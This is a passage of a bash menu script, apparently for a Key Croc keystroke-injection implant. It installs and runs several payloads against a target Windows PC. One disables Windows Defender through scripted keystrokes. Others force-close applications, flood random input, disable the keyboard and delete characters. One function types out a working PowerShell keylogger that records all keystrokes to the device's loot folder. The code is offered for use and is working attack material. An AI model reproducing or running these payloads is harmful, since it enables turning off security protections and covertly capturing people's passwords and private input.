MATCH (defenderdisable|defenderenable)\n\nif [[ \"\$LOOT\" == \"defenderenable\" ]]; then\n	LED B\n	Q GUI i\n	sleep 3\n	Q STRING \"Windows Security settings\"\n	Q ENTER\n	sleep 3\n	Q ENTER\n	sleep 3\n	Q TAB\n	Q ENTER\n	sleep 3\n	Q TAB\n	Q TAB\n	Q TAB\n	Q TAB\n	Q ENTER\n	sleep 2\n	Q LEFTARROW\n	Q ENTER\n	sleep 1\n	Q ALT-F4\n	sleep 1\n	Q ALT-F4
elif [[ \"\$LOOT\" == \"defenderdisable\" ]]; then\n	LED R\n	Q GUI i\n	sleep 3\n	Q STRING \"Windows Security settings\"\n	Q ENTER\n	sleep 3\n	Q ENTER\n	sleep 3\n	Q TAB\n	Q ENTER\n	sleep 3\n	Q TAB\n	Q TAB\n	Q TAB\n	Q TAB\n	Q ENTER\n	sleep 2\n	Q KEYCODE 00,00,2c\n	sleep 2\n	Q LEFTARROW\n	Q ENTER\n	sleep 1
	Q ALT-F4\n	sleep 1\n	Q ALT-F4\nfi" >> ${C_D}
	echo -ne "\n$(ColorGreen 'Croc_Defender PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n"
	echo -ne "\n${LINE}\n" ; cat ${C_D} ; echo -ne "\n${LINE}\n" ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; windows_defender ;;
esac
fi
}
##
#----Windows defender ENABLE/DISABLE Menu
##
MenuTitle WINDOWS DEFENDER ; MenuColor 25 1 ENABLE WINDOWS DEFENDER ; MenuColor 25 2 DISABLE WINDOWS DEFENDER ; MenuColor 25 3 CROC_DEFENDER PAYLOAD ; MenuColor 25 4 RETURN TO MAIN MENU ; MenuEnd 28
	case $m_a in
	1) defender_enable ; install_payloads ;; 2) defender_disable ; install_payloads ;; 3) croc_defender ; install_payloads ;; 4) main_menu ;; 0) exit 0 ;; [bB]) install_payloads ;; *) invalid_entry ; windows_defender ;;
	esac
else
	echo -ne "\n\e[5m$(ColorRed 'The KeyCroc is not pluged into Windows pc This will not work on this OS')-->$(OS_CHECK)\n"
fi
}
##
#----Croc_close-it payload close current running application on target pc 
##
close_it() {
	clear
	echo -ne "$(Info_Screen '
-Croc_close_it payload MATCH word croccloseit
-Close current running application on target pc
-Any keyboard activity will close current running application
-PRESS CTRL + C to break loop in terminal
-When running payload type stop to break loop')\n\n"
##
#----Croc_close_it payload install
##
	local croc_close=/root/udisk/payloads/Croc_close_it.txt
if [ -e "${croc_close}" ]; then
	echo -ne "\n$(ColorGreen 'Croc_close_it PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
	echo -ne "\n${LINE}\n" ; cat ${croc_close} ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL CROC_CLOSE_IT PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "# Title:         Croc_close_it\n#\n# Description:   Close current running application on target pc\n#                Any keyboard activity will close current running application
#                Type stop to end loop\n#\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n\nMATCH croccloseit\n\nSAVEKEYS /tmp/Croc_stop.txt UNTIL stop\n
while true ; do\nLED ATTACK\nWAIT_FOR_KEYBOARD_ACTIVITY 1\nif [ \$(sed -n 's/.*\(stop\).*/\1/p' /tmp/Croc_stop.txt.filtered) = \"stop\" ]; then\n	LED OFF\n	break\nelse
	Q ALT-F4\n	Q ENTER\n	sleep 2\n	Q ALT-F4\nfi\ndone\n" >> ${croc_close}
	echo -ne "\n${green}Croc_close_it.txt payload is now install check payloads folder${clear}\n"
	echo -ne "\n${LINE}\n" ; cat ${croc_close} ; echo -ne "\n${LINE}\n" ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; close_it ;;
	esac
fi
##
#----Croc_close_it run from terminal
##
read_all START CROC CLOSE-IT Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	local i=1
	reset_broken
	WAIT_FOR_KEYBOARD_ACTIVITY 0
	while true ; do
		WAIT_FOR_KEYBOARD_ACTIVITY 0
		if [ $broken -eq 1 ]; then
			break
		else
			Q ALT-F4
			Q ENTER
			sleep 2
			Q ALT-F4
			echo -ne "${yellow}Application has stopped COUNT: ${clear}${green}$(( i++ ))\033[0K\r${clear}"
		fi
	done ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; close_it ;;
esac
}
##
#----Double_up payload Repeat user keystroke entries
##
double_up() {
	clear
	echo -ne "$(Info_Screen '
-Double_up payload
-Repeat user keystroke entries
-This will Quack once to repeat keyboard entries
-After install unplug keycroc plug back in
-Recommended to uninstall payload when not in use, do to match word
-Press F1 to remove Double_up payload and run RELOAD_PAYLOADS command')\n\n"
	local D_U=/root/udisk/payloads/Double_up.txt
if [ -e "${D_U}" ]; then
	echo -ne "\n$(ColorGreen 'DOUBLE_UP PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
	echo -ne "\n${LINE}\n" ; cat ${D_U} ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL DOUBLE_UP PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
	echo -ne "# Title:         Double_up\n#\n# Description:   Repeat user keystroke entries\n#                This will Quack once to repeat keyboard entries\n#                Recommended to uninstall payload when not in use, do to match word\n#                Press F1 to remove Double_up payload and run RELOAD_PAYLOADS command\n#\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n
MATCH (SHIFT|CONTROL|BACKSPACE|ENTER|RIGHTARROW|LEFTARROW|UPARROW|DOWNARROW|TAB|GUI|ALT|DELETE|F1)\nMATCH ([0-9]|[a-z]|[A-Z]|[\`~!@#\$%^&*()_+=|;:',<\.>?/-]|[{]|[}]|[\"]|[ ])\n\nif [[ \"\$LOOT\" == \"SHIFT\" ]]; then\n	Q STRING \"\"\nelif [[ \"\$LOOT\" == \"CONTROL\" ]]; then\n	Q STRING \"\"\nelif [[ \"\$LOOT\" == \"BACKSPACE\" ]]; then
	Q BACKSPACE\nelif [[ \"\$LOOT\" == \"ENTER\" ]]; then\n	Q ENTER\nelif [[ \"\$LOOT\" == \"RIGHTARROW\" ]]; then\n	Q RIGHTARROW\nelif [[ \"\$LOOT\" == \"LEFTARROW\" ]]; then\n	Q LEFTARROW\nelif [[ \"\$LOOT\" == \"UPARROW\" ]]; then\n	Q UPARROW\nelif [[ \"\$LOOT\" == \"DOWNARROW\" ]]; then\n	Q DOWNARROW
elif [[ \"\$LOOT\" == \"TAB\" ]]; then\n	Q STRING \"\"\nelif [[ \"\$LOOT\" == \"GUI\" ]]; then\n	Q STRING \"\"\nelif [[ \"\$LOOT\" == \"ALT\" ]]; then\n	Q STRING ""\nelif [[ \"\$LOOT\" == \"DELETE\" ]]; then\n	Q DELETE\nelif [[ \"\$LOOT\" == \" \" ]]; then\n	Q KEYCODE 00,00,2c\nelif [[ \"\$LOOT\" == \"F1\" ]]; then\n	rm /root/udisk/payloads/Double_up.txt\n	RELOAD_PAYLOADS\nelse\n	Q STRING \"\$LOOT\"\nfi\n" >> ${D_U}
		echo -ne "\n$(ColorGreen 'DOUBLE_UP PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n"
		echo -ne "\n${LINE}\n" ; cat ${D_U} ; echo -ne "\n${LINE}\n" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; double_up ;;
	esac
fi
}
##
#----Quack Attack Payload Continuously run random Quack commands on target pc
##
q_attack() {
	clear
	echo -ne "$(Info_Screen '
-Quack_Attack payload match word quackattack
-Continuously run random character to target with Quack commands
-When running payload type stop to break loop
-PRESS CTRL + C to break loop in terminal')\n\n"
##
#----Quack Attack payload install
##
	local Q_A=/root/udisk/payloads/Quack_Attack.txt
if [ -e "${Q_A}" ]; then
	echo -ne "\n$(ColorGreen 'QUACK_ATTACK PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
	echo -ne "\n${LINE}\n" ; cat ${Q_A} ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL QUACK_ATTACK PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
	echo -ne "# Title:           Quack_Attack\n# Description:     Continuously run random Quack commands until stop is enter\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n#\n\nMATCH quackattack\n
SAVEKEYS /tmp/Croc_stop.txt UNTIL stop\n\nWAIT_FOR_KEYBOARD_ACTIVITY 0\nwhile true; do\nLED ATTACK\nif [ \$(sed -n 's/.*\(stop\).*/\1/p' /tmp/Croc_stop.txt.filtered) = \"stop\" ]; then\n	LED B\n	RELOAD_PAYLOADS\n	break
fi\nQ STRING \"\$(< /dev/urandom tr -cd '[:graph:]' | tr -d '\\\\\' | head -c 1)\$(< /dev/urandom tr -cd '[:graph:]' | tr -d '\\\\\' | head -c 1)\"\ndone\n" >> ${Q_A}
		echo -ne "\n$(ColorGreen 'QUACK_ATTACK PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n"
		echo -ne "\n${LINE}\n" ; cat ${Q_A} ; echo -ne "\n${LINE}\n" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; q_attack ;;
	esac
fi
##
#----Run Quack_Attack from terminal random character or words
##
echo -ne "\n${yellow}Select [W]-WORDS random words [C]-CHAR random character [N]-NUMBER random number\nrandom words will use american-english-huge list${clear}\n"
read_all [W]-WORDS [C]-CHAR [N]-NUMBER [B]-BACK
case $r_a in
[wW])
	if [ -f "/usr/share/dict/american-english-huge}" ]; then
		local U_L="/usr/share/dict/american-english-huge"
	else
		install_package wamerican-huge AMERICAN_WORDLIST q_attack ; local U_L="/usr/share/dict/american-english-huge"
	fi
	local WORDFILE=${U_L}
	local tL=`awk 'NF!=0 {++c} END {print c}' $WORDFILE`
	local i=1
	reset_broken
	echo -ne "${yellow}Waiting for keyboard activity${clear}"
	WAIT_FOR_KEYBOARD_ACTIVITY 0
	while true ; do
		LED B
		unset rnum R_W
		rnum=$(( $RANDOM % ${tL}+1 ))
		R_W=$(sed -n "$rnum p" $WORDFILE)
		if [ $broken -eq 1 ]; then
			break
		else
			LED G
			Q STRING "$R_W"
			Q KEYCODE 00,00,2c
			echo -ne "${yellow}QUACK_ATTACK RANDOM WORD $R_W COUNT: ${clear}${green}$(( i++ ))\033[0K\r${clear}"
		fi
	done 2> /dev/null ;;
[cC])
	local i=1
	reset_broken
	echo -ne "${yellow}Waiting for keyboard activity${clear}"
	WAIT_FOR_KEYBOARD_ACTIVITY 0
	while true ; do
		LED B
		if [ $broken -eq 1 ]; then
			break
		else
			LED G
			Q STRING "$(< /dev/urandom tr -cd '[:graph:]' | tr -d '\\' | head -c 1)$(< /dev/urandom tr -cd '[:graph:]' | tr -d '\\' | head -c 1)"
			echo -ne "${yellow}QUACK_ATTACK RANDOM CHAR COUNT: ${clear}${green}$(( i++ ))\033[0K\r${clear}"
		fi
	done 2> /dev/null ;;
[nN])
	local i=1
	reset_broken
	local NUMBER_N=1000000
	echo -ne "${yellow}Waiting for keyboard activity${clear}"
	WAIT_FOR_KEYBOARD_ACTIVITY 0
	while true ; do
		LED B
		unset R_N
		R_N=$(( $RANDOM % ${NUMBER_N}+1 ))
		if [ $broken -eq 1 ]; then
			break
		else
			LED G
			Q STRING "$R_N"
			Q KEYCODE 00,00,2c
			echo -ne "${yellow}QUACK_ATTACK RANDOM NUMBER $R_N COUNT: ${clear}${green}$(( i++ ))\033[0K\r${clear}"
		fi
	done 2> /dev/null ;;
[bB])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; q_attack ;;
esac
}
##
#----Keyboard_Killer Payload stop all keyboard active with ATTACKMODE OFF command
##
kb_killer() {
	clear
	echo -ne "$(Info_Screen '
-Keyboard_Killer payload match word killkeyboard
-Stop all keyboard active with ATTACKMODE OFF command
-Any keyboard activity will run ATTACKMODE OFF command
-Any keyboard inactivity for 10 sec will run ATTACKMODE HID 
-When running payload type stop to break loop
-PRESS CTRL + C to break loop in terminal')\n\n"
##
#----Keyboard_Killer payload install
##
	local kb_k=/root/udisk/payloads/Keyboard_Killer.txt
if [ -e "${kb_k}" ]; then
	echo -ne "\n$(ColorGreen 'KEYBOARD_KILLER PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
	echo -ne "\n${LINE}\n" ; cat ${kb_k} ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL KEYBOARD_KILLER PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
	echo -ne "# Title:           Keyboard_Killer\n# Description:     Stop all keyboard active with ATTACKMODE OFF command\n#                  Type stop to end loop\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n
MATCH killkeyboard\n\nSAVEKEYS /tmp/keyboard_stop.txt UNTIL stop\n\nwhile true; do\nif [ \$(sed -n 's/.*\(stop\).*/\1/p' /tmp/keyboard_stop.txt.filtered) = \"stop\" ]; then\n	LED G\n	RELOAD_PAYLOADS\n	break\nelse
	if WAIT_FOR_KEYBOARD_ACTIVITY 1 ; then\n	ATTACKMODE OFF\n	LED ATTACK\n	fi\n	if WAIT_FOR_KEYBOARD_INACTIVITY 10 ; then\n	ATTACKMODE HID\n	LED B\n	fi\nfi\ndone\n" >> ${kb_k}
		echo -ne "\n$(ColorGreen 'KEYBOARD_KILLER PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n"
		echo -ne "\n${LINE}\n" ; cat ${kb_k} ; echo -ne "\n${LINE}\n" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; kb_killer ;;
	esac
fi
##
#----Keyboard_Killer payload run from terminal
##
read_all START KEYBOARD_KILLER Y/N AND PRESS [ENTER]
case $r_a in
	[yY] | [yY][eE][sS])
		local i=1
		reset_broken
		while true; do
			if [ $broken -eq 1 ]; then
				break
			else
				if WAIT_FOR_KEYBOARD_ACTIVITY 1 ; then
					echo -ne "${yellow}keyboard: ${clear}${red}deactivated ${clear}${yellow}COUNT: ${clear}${green}$((i++))\033[0K\r${clear}"
					ATTACKMODE OFF &>/dev/null
				fi
				if WAIT_FOR_KEYBOARD_INACTIVITY 10 ; then
					echo -ne "${yellow}keyboard: ${clear}${green}activated ${clear}${yellow}COUNT: ${clear}${green}$((i++))\033[0K\r${clear}"
					ATTACKMODE HID &>/dev/null
				fi
			fi
		done ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; kb_killer ;;
esac
}
##
#----Croc_Attackmode payload Start keycroc Attackmode commands by entering match word
##
attack_mode() {
	echo -ne "$(Info_Screen '
-Croc_Attackmode payload
-Select which attackmode command to enter by match word:

storagemode <-- will execute ATTACKMODE HID STORAGE
hidmode <-- will execute ATTACKMODE HID
offmode <-- will execute ATTACKMODE OFF
reloadmode <-- will execute RELOAD_PAYLOADS
armingmode <-- will execute ARMING_MODE
rostoragemode <-- will execute ATTACKMODE RO_STORGE
autoethernet <-- will execute ATTACKMODE AUTO_ETHERNET
serialmode <-- will execute ATTACKMODE SERIAL

-On some attackmode command after running reset keycroc
by unplugging keycroc and plug back in')\n\n"
##
#----Croc_Attackmode payload install
##
local Croc_Attackmode=/root/udisk/payloads/Croc_Attackmode.txt
if [ -e "${Croc_Attackmode}" ]; then
	echo -ne "\n$(ColorGreen 'CROC_ATTACKMODE PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
	echo -ne "\n${LINE}\n" ; cat /root/udisk/payloads/Croc_Attackmode.txt ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL CROC_ATTACKMODE PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
	echo -ne "# Title:         Croc Attack_mode\n#\n# Description:   Enter keycroc ATTACKMODE commands with payload just enter match word\n#\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n
MATCH (storagemode|hidmode|offmode|reloadmode|armingmode|rostoragemode|autoethernet|serialmode)\n\ncase \$LOOT in\n	storagemode) ATTACKMODE HID STORAGE ;;\n	hidmode) ATTACKMODE HID ;;\n	offmode) ATTACKMODE OFF ;;
	reloadmode) RELOAD_PAYLOADS ;;\n	armingmode) ARMING_MODE ;;\n	rostoragemode) ATTACKMODE RO_STORGE ;;\n	autoethernet) ATTACKMODE AUTO_ETHERNET ;;\n	serialmode) ATTACKMODE SERIAL ;;\nesac\n" >> ${Croc_Attackmode}
		echo -ne "\n$(ColorGreen 'CROC_ATTACKMODE PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n"
		echo -ne "\n${LINE}\n" ; cat /root/udisk/payloads/Croc_Attackmode.txt ; echo -ne "\n${LINE}\n" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; attack_mode ;;
	esac
fi
}
##
#----Delete_Char payload delete all character on target pc by payload/terminal/ or at will
##
Delete_Char() {
	clear
	echo -ne "$(Info_Screen '
-Delete_Char payload match word deletechar
-Run from payload, terminal or press backspace at will
-Delete character on target pc
-Continuously run (Q BACKSPACE)
(I) Install Delete_Char payload, type stop to break loop
(T) Run from terminal, PRESS CTRL + C to break loop
(P) Press BACKSPACE at will, anything else will break loop
(N) Return back to menu')\n\n"
read_all [I]-INSTALL [T]-TERMINAL [P]-PRESS [N]-NONE AND PRESS [ENTER]
case $r_a in
[Ii])
	echo -ne "$(Info_Screen '
-Installing Delete_Char payload
-Match word deletechar
-Type stop to break loop')\n\n"
	local D_C=/root/udisk/payloads/Delete_Char.txt
	if [ -e "${D_C}" ]; then
		echo -ne "\n$(ColorGreen 'DELETE CHAR PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
		echo -ne "\n${LINE}\n" ; cat /root/udisk/payloads/Delete_Char.txt ; echo -ne "\n${LINE}\n"
	else
	echo -ne "# Title:           Delete Char\n# Description:     Continuously run Q backspace, delete all character\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n
MATCH deletechar\n\nSAVEKEYS /tmp/Croc_stop.txt UNTIL stop\nWAIT_FOR_KEYBOARD_ACTIVITY 0\nwhile true; do\nLED ATTACK\nif [ \$(sed -n 's/.*\(stop\).*/\1/p' /tmp/Croc_stop.txt.filtered) = \"stop\" ]; then
	LED B\n	RELOAD_PAYLOADS\n	break\nelse\n	Q BACKSPACE\n	Q BACKSPACE\nfi\ndone\n" >> ${D_C}
		echo -ne "\n$(ColorGreen 'DELETE CHAR PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n"
		echo -ne "\n${LINE}\n" ; cat /root/udisk/payloads/Delete_Char.txt ; echo -ne "\n${LINE}\n"
	fi ;;
[Tt])
	echo -ne "$(Info_Screen '
-Continuously run (Q BACKSPACE) to target pc
-PRESS CTRL + C to break loop')\n\n"
	local i=1
	reset_broken
	echo -ne "${yellow}WAITING FOR KEYBOARD ACTIVITY${clear}\n\n"
	WAIT_FOR_KEYBOARD_ACTIVITY 0
	while true ; do
		LED ATTACK
		if [ $broken -eq 1 ]; then
			LED OFF
			break
		else
			Q BACKSPACE
			Q BACKSPACE
			echo -ne "${yellow}BACKSPACE COUNT: ${clear}${green}$(( i++ ))\033[0K\r${clear}"
		fi
	done 2> /dev/null ;;
[Pp])
	echo -ne "$(Info_Screen '
-Press BACKSPACE at will
-Press anything else will break loop
-Run this on remote terminal')\n\n"
	local i=1
	echo -ne "${yellow}PRESS BACKSPACE AT WILL${clear}\n\n"
	while IFS= read -r -n1 -s backspace; do
		case ${backspace} in
		$'\177')
			Q BACKSPACE
			echo -ne "${yellow}BACKSPACE COUNT: ${clear}${green}$(( i++ ))\033[0K\r${clear}" ;;
		*)
			break ;;
		esac
	done ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; Delete_Char ;;
esac
}
##
#----Log Windows keystrokes & save to loot/Croc_Pot (this not keycroc keystrokes logging)
##
function keystrokes_laptop() {
	echo -ne "\n${yellow}KeyCroc is pluged into OS${clear} --> $(OS_CHECK)\n"
	echo -ne "$(Info_Screen '
-With this payload log keystrokes from windows laptop pc
-May need to disable windows defender for this to work
-TO STOP THE PAYLOAD PRESS Ctrl + c
-When stop this will open up notepad and save to loot/Croc_Pot')\n"
if [ "$(OS_CHECK)" = WINDOWS ]; then
	ATTACKMODE HID STORAGE
	sleep 5 ; Q GUI r ; sleep 2 ; Q STRING "powershell -nop -ex Bypass" ; Q ENTER ; sleep 1
	Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
	Q ENTER ; sleep 1
	Q STRING "function Test-KeyLogger(\$LOOTDIR=\"\$Croc\loot\Croc_Pot\winkeylogger.txt\")"
	Q ENTER ; Q STRING "{" ; Q ENTER
##
#----API declaration
##
	Q STRING "\$APIsignatures = @'" ; Q ENTER
	Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)]" ; Q ENTER 
	Q STRING "public static extern short GetAsyncKeyState(int virtualKeyCode);" ; Q ENTER 
	Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]" ; Q ENTER
	Q STRING "public static extern int GetKeyboardState(byte[] keystate);" ; Q ENTER
	Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]" ; Q ENTER
	Q STRING "public static extern int MapVirtualKey(uint uCode, int uMapType);" ; Q ENTER
	Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]" ; Q ENTER
	Q STRING "public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);" ; Q ENTER
	Q STRING "'@" ; Q ENTER
	Q STRING "\$API = Add-Type -MemberDefinition \$APIsignatures -Name 'Win32' -Namespace API -PassThru" ; Q ENTER
##
#----output file
##
	Q STRING "\$no_output = New-Item -Path \$LOOTDIR -ItemType File -Force" ; Q ENTER
	Q STRING "try" ; Q ENTER ; Q STRING "{" ; Q ENTER
	Q STRING "Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red" ; Q ENTER
	Q STRING "while (\$true) {" ; Q ENTER ; Q STRING "Start-Sleep -Milliseconds 40" ; Q ENTER
	Q STRING "for (\$ascii = 9; \$ascii -le 254; \$ascii++) {" ; Q ENTER
##
#----get key state
##
	Q STRING "\$keystate = \$API::GetAsyncKeyState(\$ascii)" ; Q ENTER
##
#----if key pressed
##
	Q STRING "if (\$keystate -eq -32767) {" ; Q ENTER ; Q STRING "\$null = [console]::CapsLock" ; Q ENTER
##
#----translate code
##
	Q STRING "\$virtualKey = \$API::MapVirtualKey(\$ascii, 3)" ; Q ENTER
##
#----get keyboard state and create stringbuilder
##
	Q STRING "\$kbstate = New-Object Byte[] 256" ; Q ENTER ; Q STRING "\$checkkbstate = \$API::GetKeyboardState(\$kbstate)" ; Q ENTER
	Q STRING "\$loggedchar = New-Object -TypeName System.Text.StringBuilder" ; Q ENTER
##
#----translate virtual key
##
	Q STRING "if (\$API::ToUnicode(\$ascii, \$virtualKey, \$kbstate, \$loggedchar, \$loggedchar.Capacity, 0))" ; Q ENTER ; Q STRING "{" ; Q ENTER
##
#----if success, add key to logger file
##
	Q STRING "[System.IO.File]::AppendAllText(\$LOOTDIR, \$loggedchar, [System.Text.Encoding]::Unicode)" ; Q ENTER 
	Q STRING "}" ; Q ENTER ; Q STRING "}" ; Q ENTER ; Q STRING "}" ; Q ENTER ; Q STRING "}" ; Q ENTER ; Q STRING "}"
	Q ENTER ; Q STRING "finally" ; Q ENTER ; Q STRING "{" ; Q ENTER ; Q STRING "notepad \$LOOTDIR" ; Q ENTER ; Q STRING "}"
	Q ENTER ; Q STRING "}" ; Q ENTER ; Q STRING "Test-KeyLogger" ; Q ENTER ; LED ATTACK
else
	echo -ne "\n\e[4;5m$(ColorRed 'The KeyCroc is not pluged into Windows pc This will not work on this OS')-->${clear}$(OS_CHECK)\n"
fi
}
##
#----Restricted_words payload Delete, lock keyboard and close current application
##
Restricted_words() {
	clear
	echo -ne "$(Info_Screen '
-Restricted words payload
-Delete, lock keyboard for 10 sec and close current application
with match word edit payload with any words of choice
-Idle for parental control

Default words:
sex|porn|sudo|administrator|admin|password|username|facebook')\n\n"
	local restricted_word=/root/udisk/payloads/Restricted_words.txt
	if [ -e "${restricted_word}" ]; then
		echo -ne "\n$(ColorGreen 'RESTRICTED WORDS PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
		echo -ne "\n${LINE}\n" ; cat ${restricted_word} ; echo -ne "\n${LINE}\n"
	else
		read_all INSTALL RESTRICTED WORDS PAYLOAD Y/N AND PRESS [ENTER]
			case $r_a in
			[yY] | [yY][eE][sS])
				echo -ne "# Title:           Restricted words\n# Description:     Delete, lock keyboard for 10 sec and close current application with match word\n#                  edit with any words, idle for parental control
# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n\nMATCH (sex|porn|sudo|administrator|admin|password|username|facebook)\n\nLED ATTACK
Q CONTROL-SHIFT-LEFTARROW\nQ BACKSPACE\nQ ALT-F4\nQ ALT-F4\nATTACKMODE OFF\nWAIT_FOR_KEYBOARD_INACTIVITY 10\nATTACKMODE HID\nLED B\nsleep 1\nLED OFF\n" > ${restricted_word}
				echo -ne "\n$(ColorGreen 'RESTRICTED WORDS IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n"
				echo -ne "\n${LINE}\n" ; cat ${restricted_word} ; echo -ne "\n${LINE}\n" ;;
			[nN] | [nN][oO])
				echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
			*)
				invalid_entry ; Restricted_words ;;
			esac
	fi
}
##
#----Install Payloads Menu
##
MenuTitle INSTALL PAYLOADS MENU
echo -ne "\t\t" ; MenuColor 22 1 GETONLINE PAYLOAD | tr -d '\t\n' ; MenuColor 21 10 CROC_FORCE PAYLOAD | tr -d '\t'
echo -ne "\t\t" ; MenuColor 22 2 CROC_UNLOCK PAYLOAD | tr -d '\t\n' ; MenuColor 21 11 CROC_LOCKOUT PAYLOAD | tr -d '\t'
echo -ne "\t\t" ; MenuColor 22 3 WIFI SETUP PAYLOAD | tr -d '\t\n' ; MenuColor 21 12 WINDOWS DEFENDER | tr -d '\t'
echo -ne "\t\t" ; MenuColor 22 4 QUICK START CROC_POT | tr -d '\t\n' ; MenuColor 21 13 CROC_CLOSE_IT PAYLOAD | tr -d '\t'
echo -ne "\t\t" ; MenuColor 22 5 CROC_SHOT PAYLOAD | tr -d '\t\n' ; MenuColor 21 14 DOUBLE_UP PAYLOAD | tr -d '\t'
echo -ne "\t\t" ; MenuColor 22 6 CROC_BITE PAYLOAD | tr -d '\t\n' ; MenuColor 21 15 QUACK_ATTACK PAYLOAD | tr -d '\t'
echo -ne "\t\t" ; MenuColor 22 7 CROC_REDIRECT PAYLOAD | tr -d '\t\n' ; MenuColor 21 16 KEYBOARD_KILLER | tr -d '\t'
echo -ne "\t\t" ; MenuColor 22 8 NO SLEEPING PAYLOAD | tr -d '\t\n' ; MenuColor 21 17 KEYCROC ATTACKMODE | tr -d '\t'
echo -ne "\t\t" ; MenuColor 22 9 CROC_REPLACE PAYLOAD | tr -d '\t\n' ; MenuColor 21 18 DELETE CHAR PAYLOAD | tr -d '\t'
MenuColor 22 19 KEYSTROKES LAPTOP ; MenuColor 22 20 RESTRICTED WORDS ; MenuColor 22 21 RETURN TO MAIN MENU ; MenuEnd 25
	case $m_a in
	1) get_online_p ; install_payloads ;; 2) croc_unlock_p ; install_payloads ;; 3) wifi_setup_p ; install_payloads ;; 4) quick_croc_pot ; install_payloads ;; 5) screen_shot ; install_payloads ;;
	6) croc_bite ; install_payloads ;; 7) web_site ; install_payloads ;; 8) screen_on ; install_payloads ;; 9) text_replace ; install_payloads ;; 10) Brute_force ; install_payloads ;;
	11) croc_lock ; install_payloads ;; 12) windows_defender ; install_payloads ;; 13) close_it ; install_payloads ;;
	14) double_up ; install_payloads ;; 15) q_attack ; install_payloads ;; 16) kb_killer ; install_payloads ;; 17) attack_mode ; install_payloads ;; 18) Delete_Char ; install_payloads ;;
	19) keystrokes_laptop ; install_payloads ;; 20) Restricted_words ; install_payloads ;; 21) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; install_payloads ;;
	esac
}
##
#----O.MG cable Menu/Functions
##
function omg_cable() {
	clear
	local omg_v=/root/udisk/tools/Croc_Pot/OMG_WIFI.txt
	echo -ne "$(Info_Screen '
-# 1 connect keycroc to O.MG wifi access point
-# 2 Start O.MG web UI ensure keycroc is connected to O.MG AP first
-# 3 O.MG Github web page
-# 4 Create payload to connect Quickly to O.MG wifi access point
-# 5 Scan local network for O.MG cable')\n\n"
##
#----O.MG connect keycroc to O.MG wifi access point
##
omg_wifi() {
	clear
	echo -ne "$(Info_Screen '
-Connect keycroc wifi to O.MG wifi access point
-Ensure O.MG cable is setup as wifi access point
-The purpose to this is access O.MG cable or Keycroc remotely
from a remote device that is connected to O.MG wifi access point

O.MG C-to-C Directional Keylogger with the keycroc
-USB adapters:
one usb usb-A female to usb-A female extension adapter coupler
Two usb-A male to usb-C female

-Plug keyboard into one end of the usb-A female coupler other end of
